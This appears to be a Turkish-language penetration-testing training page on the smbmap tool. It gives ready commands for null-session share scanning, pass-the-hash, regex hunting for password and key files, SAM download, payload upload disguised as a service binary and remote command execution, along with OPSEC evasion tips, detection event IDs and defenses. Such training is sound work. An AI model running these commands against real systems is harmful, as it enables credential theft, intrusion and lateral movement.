# smbmap

> **Kategori:** [1. TEMEL İSTEMCİLER VE AĞ PROTOKOL ARAÇLARI (NATIVE CLIENTS & UTILITIES)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Paylaşım izinlerini (READ/WRITE) tarama, dosya listeleme, regex ile hassas dosya arama, upload/download.

---

## 1. Genel Bakış ve Amaç

`smbmap`, SMB paylaşımlarını **izin odaklı** tarayan bir Python aracıdır. [smbclient](./smbclient.md)'ın aksine tek tek paylaşıma bağlanmak yerine, hedef üzerindeki **tüm paylaşımları otomatik tarar** ve her birinde READ / WRITE erişim seviyesini raporlar. Bir sızma testinde "hangi paylaşıma ne yapabilirim?" sorusuna saniyeler içinde cevap verir.

### Temel Yetenekler

```
┌────────────┐                        ┌────────────┐
│  smbmap    │  SMB Session Setup     │  Hedef     │
│  (Saldırı) │ ─────────────────────► │  (DC/Srv)  │
│            │  Tree Connect (her     │            │
│            │   paylaşıma sırayla)   │            │
│            │ ─────────────────────► │            │
│            │  CreateFile / ReadDir  │            │
│            │  (izin sınaması)       │            │
│            │ ◄───────────────────── │            │
│  Sonuç:    │                        │            │
│  READ/WRITE│                        │            │
│  NO ACCESS │                        │            │
└────────────┘                        └────────────┘
```

| Özellik | Açıklama |
|---|---|
| **İzin Haritası** | Her paylaşımın READ / WRITE / NO ACCESS durumunu gösterir |
| **Recursive Listeleme** | Alt dizinlerdeki dosyaları derinlemesine listeler |
| **Regex Arama** | Dosya adlarında regex ile hassas dosya avcılığı (`*password*`, `*.kdbx`) |
| **Dosya İndirme/Yükleme** | Hedef paylaşımdan dosya çekme veya payload yükleme |
| **Komut Çalıştırma** | Yazılabilir paylaşım + admin erişimi ile uzaktan komut |
| **Toplu Tarama** | `--host-file` ile birden fazla hedefi tek seferde tara |
| **Pass-the-Hash** | NTLM hash ile doğrudan kimlik doğrulama |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

```bash
smbmap [-H hedef] [-u kullanıcı] [-p parola] [seçenekler]
```

### Bağlantı ve Kimlik Doğrulama

| Parametre | Açıklama | Örnek |
|---|---|---|
| `-H` | Hedef IP/hostname | `-H 10.10.10.100` |
| `-u` | Kullanıcı adı | `-u 'j.doe'` |
| `-p` | Parola **veya** NT hash | `-p 'Summer2024!'` |
| `-d` | Domain adı | `-d CORP` |
| `-P` | SMB portu (varsayılan 445) | `-P 139` |
| `--host-file` | Hedef listesi dosyası | `--host-file targets.txt` |
| `-A` | Regex ile eşleşen dosyaları otomatik indir | `-A '.*password.*'` |
| `-k` | Kerberos kimlik doğrulama | `-k` |

### Tarama ve Listeleme

| Parametre | Açıklama | Örnek |
|---|---|---|
| `-r` | Belirtilen paylaşımda dizin listele (tek seviye) | `-r 'C$\Users'` |
| `-R` | Tam recursive listeleme | `-R 'Backup'` |
| `--depth` | Recursive derinlik limiti | `--depth 3` |
| `-s` | Belirli bir paylaşımı hedefle | `-s 'SYSVOL'` |
| `-g` | Grep yapılabilir çıktı | `-g` |
| `--csv` | CSV formatında çıktı | `--csv` |
| `-q` | Sessiz mod (sadece erişilebilir paylaşımlar) | `-q` |
| `--no-banner` | Banner'ı gizle | `--no-banner` |
| `-L` | Sürücü listeleme (admin) | `-L` |
| `--admin` | Admin erişimli paylaşımları kontrol et | `--admin` |
| `--no-write-check` | Yazma kontrolü yapma | `--no-write-check` |

### Dosya İşlemleri ve Komut Çalıştırma

| Parametre | Açıklama | Örnek |
|---|---|---|
| `--download` | Dosya indir (paylaşım yolu) | `--download 'C$\Windows\repair\SAM'` |
| `--upload` | Dosya yükle (kaynak hedef) | `--upload '/tmp/shell.exe' 'C$\Temp\svc.exe'` |
| `-x` | Uzaktan komut çalıştır (admin) | `-x 'whoami /all'` |
| `--dir-only` | Sadece dizinleri listele | `--dir-only` |
| `--exclude` | Listelemeden hariç tutulacak paylaşımlar | `--exclude 'IPC$' 'PRINT$'` |
| `-F` | Dosya içeriğinde arama (regex) | `-F '.*\.config'` |
| `--timeout` | Bağlantı zaman aşımı (saniye) | `--timeout 10` |

---

## 3. Pratik Komut Örnekleri

### 3.1 Null Session Paylaşım Tarama

```bash
# Null session ile izin haritası
smbmap -H 10.10.10.100 -u '' -p ''

# Çıktı:
# [+] IP: 10.10.10.100:445  Name: DC01.corp.local
#   Disk          Permissions     Comment
#   ----          -----------     -------
#   ADMIN$        NO ACCESS       Remote Admin
#   C$            NO ACCESS       Default share
#   IPC$          READ ONLY       Remote IPC
#   NETLOGON      READ ONLY       Logon server share
#   SYSVOL        READ ONLY       Logon server share
#   Backup        READ, WRITE     IT Backup Share
```

### 3.2 Kimlik Doğrulamalı Tam Tarama

```bash
# Domain kullanıcısı ile tüm paylaşımları tara
smbmap -H DC01.corp.local -u 'j.doe' -p 'Summer2024!' -d CORP

# Guest session denemesi
smbmap -H 10.10.10.100 -u 'guest' -p ''
```

### 3.3 Pass-the-Hash ile Tarama

```bash
# NT hash ile kimlik doğrulama
smbmap -H 10.10.10.100 -u 'Administrator' \
  -p 'aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4' -d CORP

# Sadece NT hash yeterli (LM kısmı boş bırakılabilir)
smbmap -H 10.10.10.100 -u 'svc_backup' \
  -p '00000000000000000000000000000000:7a21990fcd3d759941e45c490f143d5f' -d CORP
```

### 3.4 Recursive Dosya Listeleme

```bash
# SYSVOL paylaşımını derinlemesine listele
smbmap -H DC01.corp.local -u 'j.doe' -p 'Summer2024!' -d CORP \
  -R 'SYSVOL' --depth 5

# C$ üzerinde belirli bir dizini listele
smbmap -H SRV01.corp.local -u 'admin' -p 'P@ss!' -d CORP \
  -r 'C$\Users\Administrator\Desktop'
```

### 3.5 Regex ile Hassas Dosya Arama ve Otomatik İndirme

```bash
# Parola içerebilecek dosyaları bul ve otomatik indir
smbmap -H DC01.corp.local -u 'j.doe' -p 'Summer2024!' -d CORP \
  -R -A '(password|credential|secret|\.kdbx|\.config|unattend|web\.config)' \
  --depth 5

# İndirilen dosyalar mevcut dizine kaydedilir:
#   [+] Match found! Downloading: Backup/IT/passwords.xlsx
#   [+] Match found! Downloading: Backup/Scripts/deploy.config

# GPP XML dosyalarını hedefle
smbmap -H DC01.corp.local -u 'j.doe' -p 'Summer2024!' -d CORP \
  -R 'SYSVOL' -A '\.xml$'
```

### 3.6 Dosya İndirme / Yükleme

```bash
# Belirli bir dosyayı indir
smbmap -H SRV01.corp.local -u 'admin' -p 'P@ss!' -d CORP \
  --download 'Backup\Database\db_backup.bak'

# Payload yükle
smbmap -H SRV01.corp.local -u 'admin' -p 'P@ss!' -d CORP \
  --upload '/tmp/rev.exe' 'C$\Windows\Temp\svc_update.exe'
```

### 3.7 Uzaktan Komut Çalıştırma (Admin Gerekli)

```bash
# Admin paylaşımı üzerinden komut çalıştır
smbmap -H SRV01.corp.local -u 'Administrator' -p 'P@ss!' -d CORP \
  -x 'whoami /all'

# Ağ bilgisi topla
smbmap -H SRV01.corp.local -u 'Administrator' -p 'P@ss!' -d CORP \
  -x 'ipconfig /all'

# Servis durumu kontrol
smbmap -H SRV01.corp.local -u 'Administrator' -p 'P@ss!' -d CORP \
  -x 'net user /domain'
```

### 3.8 Toplu Hedef Tarama

```bash
# Hedef listesinden tüm makineleri tara
echo -e "10.10.10.100\n10.10.10.101\n10.10.10.102" > targets.txt
smbmap --host-file targets.txt -u 'j.doe' -p 'Summer2024!' -d CORP

# CSV çıktı ile raporlama
smbmap --host-file targets.txt -u 'j.doe' -p 'Summer2024!' -d CORP --csv \
  > smb_audit.csv
```

### 3.9 Yazılabilir Paylaşım Keşfi (Lateral Movement Hazırlığı)

```bash
# Sadece WRITE erişimi olan paylaşımları filtrele
smbmap -H DC01.corp.local -u 'j.doe' -p 'Summer2024!' -d CORP -q \
  2>&1 | grep 'READ, WRITE'

# Tüm alt ağı tara ve yazılabilir olanları bul
for ip in $(seq 100 120); do
  echo "--- 10.10.10.$ip ---"
  smbmap -H 10.10.10.$ip -u 'j.doe' -p 'Summer2024!' -d CORP -q \
    2>/dev/null | grep 'WRITE'
done
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı | Olası Neden | Çözüm |
|---|---|---|
| `[!] Authentication error on <IP>` | Yanlış kimlik bilgisi veya hesap kilitli | Kullanıcı/parola doğrula; hesap kilitleme politikasını kontrol et |
| `[!] Access Denied` | Yetersiz yetki | Farklı hesap dene; null session test et |
| `[!] Connection error on <IP>` | Port kapalı veya firewall | `nmap -p 445 <IP>` ile kontrol et |
| `NT_STATUS_CONNECTION_RESET` | SMB sürümü uyumsuzluğu | `--smb2` bayrağını dene |
| Boş çıktı (paylaşım yok) | Null session izni yok veya RestrictAnonymous | Kimlik bilgisi ile tekrar dene |
| `[!] RPC Error` | RPC servisi yanıt vermiyor | `-P 139` ile NetBIOS portu üzerinden dene |
| Regex eşleşme yok (`-A`) | Desenin dosya adıyla uyuşmadığı | Regex'i test et; `-R` derinliğini artır (`--depth 10`) |
| Çok yavaş tarama | Büyük paylaşım + derin recursive | `--depth` ile sınırla; `--exclude` ile gereksiz paylaşımları çıkar |

### smbmap vs smbclient Karşılaştırma

| Özellik | smbmap | smbclient |
|---|---|---|
| **İzin tarama** | ✅ Otomatik (tüm paylaşımlar) | ❌ Manuel (tek tek bağlan) |
| **Regex dosya arama** | ✅ `-A` ile yerleşik | ❌ Yok (grep ile kombinasyon) |
| **Toplu hedef** | ✅ `--host-file` | ❌ Bash loop gerekir |
| **İnteraktif kabuk** | ❌ Yok | ✅ FTP benzeri kabuk |
| **PTH desteği** | ✅ `-p` ile hash | ✅ `--pw-nt-hash` |
| **Komut çalıştırma** | ✅ `-x` | ❌ Yok |
| **Tar yedekleme** | ❌ Yok | ✅ `-T` ile tar |

---

## 5. OPSEC ve Karşı Tespit (IOC)

### 5.1 Bırakılan İzler

| Kaynak | Event ID / Log | Detay |
|---|---|---|
| **Windows Security** | **4624** (Type 3) | Her hedef için network logon |
| **Windows Security** | **4625** | Başarısız kimlik doğrulama (null session reddi) |
| **Windows Security** | **5140** | Paylaşıma erişim — her paylaşım için ayrı olay |
| **Windows Security** | **5145** | Dosya/dizin erişim denetimi |
| **Windows Security** | **4776** | NTLM kimlik doğrulama (DC tarafında) |

### 5.2 Tespit İmzaları

- **Kısa sürede çok sayıda 5140 olayı:** smbmap tüm paylaşımları sırayla dener → tek IP'den saniyeler içinde 5-15 paylaşım erişim kaydı = anomali.
- **READ/WRITE izin sınaması:** Her paylaşımda dosya oluşturma/silme denemesi yapılır (yazma kontrolü) → kısa ömürlü geçici dosya izi bırakabilir.
- **`--host-file` taraması:** Alt ağ genelinde birçok hedefe sıralı SMB bağlantısı → SIEM'de lateral scan tespiti.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | smbmap Kullanımı |
|---|---|---|
| **T1135** | Network Share Discovery | Paylaşım ve izin tarama |
| **T1039** | Data from Network Shared Drive | Dosya indirme (`--download`, `-A`) |
| **T1021.002** | Remote Services: SMB/Admin Shares | Admin paylaşımlarına erişim |
| **T1570** | Lateral Tool Transfer | `--upload` ile payload yükleme |
| **T1059.003** | Command and Scripting: Windows CMD | `-x` ile uzaktan komut çalıştırma |

### 5.4 OPSEC Önerileri

| Risk | Önlem |
|---|---|
| **Toplu paylaşım taraması gürültülü** | `--exclude 'IPC$' 'PRINT$'` ile gereksiz paylaşımları atla |
| **Yazma kontrolü iz bırakır** | `--no-write-check` ile yazma testini devre dışı bırak |
| **Regex tarama yavaş ve loglanır** | Derinliği sınırla (`--depth 3`); hedefli tara |
| **Komut çalıştırma (-x) yüksek alarm** | `-x` kullanımı ADMIN$ üzerinden çalışır; EDR tarafından yakalanır |
| **PTH tespiti** | NTLMv2 ile PTH, 4624 Type 3 + 4776'da loglanır |

### 5.5 Savunma Karşılığı

- Paylaşım erişim denetimi → [Blue M01 — Görünürlük](../../../2-Blue_Team/Modul_01_Gorunurluk_ve_Log_Yonetimi/)
- SMB Signing → [Blue M08 — Protokol Sertleştirme](../../../2-Blue_Team/Modul_08_Protokol_Sertlestirme_ve_Relay_Onleme/)
- Null session engelleme → `RestrictAnonymous=2` GPO
- Yazılabilir paylaşım azaltma → en az yetki prensibi ile NTFS + Share izinleri

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Hızlı Referans / Cheat Sheet)

Aşağıdaki liste, sızma testlerinde ve kırmızı takım operasyonlarında en sık kullanılan `smbmap` komutlarını, kullanım amaçlarını ve parametre analizlerini bir araya getirir:

### 6.1 Anonim (Null / Guest) Paylaşım İzin Taraması
```bash
smbmap -H 192.168.1.10 -u '' -p ''
```
- **Ne Yapar?** Kimlik bilgisi vermeden hedef sunucudaki tüm paylaşımları tarar ve izin durumlarını (`NO ACCESS`, `READ ONLY`, `READ, WRITE`) tablo olarak gösterir.
- **Ne Zaman Kullanılır?** İlk ağ keşfinde misafirlere veya parolasız erişime açık paylaşımları hızlıca tespit etmek için.
- **Parametreler:** `-H` (Hedef IP/host), `-u '' -p ''` (Boş kullanıcı ve parola ile null session dener).

### 6.2 Etki Alanı Kullanıcı Kimliği ile Yetki Taraması
```bash
smbmap -H 192.168.1.10 -d LAB -u j.doe -p 'Password123!'
```
- **Ne Yapar?** Etki alanı kullanıcısının kimlik bilgileriyle oturum açarak tüm paylaşımlardaki okuma/yazma izinlerini test eder.
- **Ne Zaman Kullanılır?** Bir kullanıcı ele geçirildiğinde, hangi dosya paylaşımlarına yazma veya okuma hakkı olduğunu saniyeler içinde haritalamak için.
- **Parametreler:** `-d` (Etki alanı adı), `-u` (Kullanıcı adı), `-p` (Parola).

### 6.3 Alt Ağ veya IP Listesi Üzerinde Toplu Paylaşım Taraması
```bash
smbmap --host-file ip_listesi.txt -d LAB -u j.doe -p 'Password123!'
```
- **Ne Yapar?** Dosyadaki tüm IP adreslerini sırayla tarar ve erişilebilir paylaşımların toplu izin tablosunu çıkarır.
- **Ne Zaman Kullanılır?** Geniş ağlarda dosya sunucularını ve zafiyetli/yazılabilir paylaşımları otomatik tespit etmek için.
- **Parametreler:** `--host-file` (Hedef IP/host listesini içeren dosya yolu).

### 6.4 NTLM Hash ile Pass-the-Hash Paylaşım Taraması
```bash
smbmap -H 192.168.1.10 -d LAB -u Administrator -p 'aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'
```
- **Ne Yapar?** Düz metin parola yerine LM:NT hash ikilisini kullanarak Pass-the-Hash ile paylaşımlara erişimi kontrol eder.
- **Ne Zaman Kullanılır?** SAM veya NTDS dökümünden hash alındığında doğrudan yönetici paylaşımlarını (`C$`, `ADMIN$`) teyit etmek için.
- **Parametreler:** `-p` (LM:NT formatında hash kabul eder).

### 6.5 Belirli Bir Paylaşımı Belirtilen Derinlikte Rekürsif Listeleme
```bash
smbmap -H 192.168.1.10 -d LAB -u j.doe -p 'Password123!' -r 'Yedekler' --depth 3
```
- **Ne Yapar?** `Yedekler` isimli paylaşımın alt klasörlerini maksimum 3 seviye derinliğe kadar listeler.
- **Ne Zaman Kullanılır?** İzin verilen bir paylaşımda hangi dizinlerin ve alt klasörlerin bulunduğunu ağ trafiğini boğmadan incelemek için.
- **Parametreler:** `-r` (Recursive: listelenecek paylaşım adı), `--depth` (Taramayı sınırlandırmak için maksimum klasör derinliği).

### 6.6 Regex ile Hassas Dosya Adı Arama (Parola, Sertifika, Anahtar Avı)
```bash
smbmap -H 192.168.1.10 -d LAB -u j.doe -p 'Password123!' -A '(password|sifre|kullanici|secret|config|\.kdbx|\.ovpn|\.id_rsa)' -q
```
- **Ne Yapar?** Erişilebilen tüm paylaşımlarda regex kalıbına uyan dosya adlarını otomatik arar ve yollarını ekrana basar.
- **Ne Zaman Kullanılır?** Paylaşımlarda unutulmuş parola dosyalarını, KeePass veritabanlarını ve SSH özel anahtarlarını avlamak için.
- **Parametreler:** `-A` (Aranacak regex deseni), `-q` (Quiet: gereksiz banner ve çıktıları gizler, sadece eşleşmeleri gösterir).

### 6.7 Belirli Bir Dosyayı Paylaşımdan Doğrudan İndirme
```bash
smbmap -H 192.168.1.10 -d LAB -u j.doe -p 'Password123!' --download 'Yedekler\config.kdbx'
```
- **Ne Yapar?** Paylaşım içindeki dosyayı yerel saldırı makinesine indirir.
- **Ne Zaman Kullanılır?** Regex aramasında bulunan hassas dosyayı kabuk açmadan doğrudan yerel diske çekmek için.
- **Parametreler:** `--download` (İndirilecek dosyanın tam paylaşım yolu `Paylaşım\Klasör\Dosya`).

### 6.8 Yazılabilir Bir Paylaşıma Dosya / Payload Yükleme
```bash
smbmap -H 192.168.1.10 -d LAB -u j.doe -p 'Password123!' --upload '/opt/payloads/update.exe' 'YazilabilirShare\update.exe'
```
- **Ne Yapar?** Yerel makinedeki bir dosyayı uzaktaki hedef paylaşıma yükler.
- **Ne Zaman Kullanılır?** DLL hijacking, SCF zafiyeti tetikleme veya uzaktan kod yürütme amacıyla hedef sisteme dosya bırakmak için.
- **Parametreler:** `--upload` (`[yerel_dosya] [uzak_hedef_yol]` formatında dosya transferi).

### 6.9 Yönetici Yetkisi ile Uzaktan Komut Çalıştırma (Admin Shell)
```bash
smbmap -H 192.168.1.10 -d LAB -u Administrator -p 'Password123!' -x 'whoami /all'
```
- **Ne Yapar?** Yönetici haklarına sahip hesapla SMB üzerinden uzaktan komut koşturur ve stdout çıktısını ekrana döker.
- **Ne Zaman Kullanılır?** WinRM veya RDP kapalıyken hızlı komut yürütme ve hedefte yetki doğrulaması yapmak için.
- **Parametreler:** `-x` (Çalıştırılacak Windows komutu).

---

## Kaynaklar

| Kaynak | Bağlantı |
|---|---|
| smbmap GitHub | [github.com/ShawnDEvans/smbmap](https://github.com/ShawnDEvans/smbmap) |
| MITRE T1135 | [attack.mitre.org](https://attack.mitre.org/techniques/T1135/) |
| HackTricks — SMB | [book.hacktricks.wiki](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smb.html) |

---

> **Önceki:** [← smbclient](./smbclient.md) · **Sonraki:** [impacket-smbclient →](./impacket-smbclient.md)

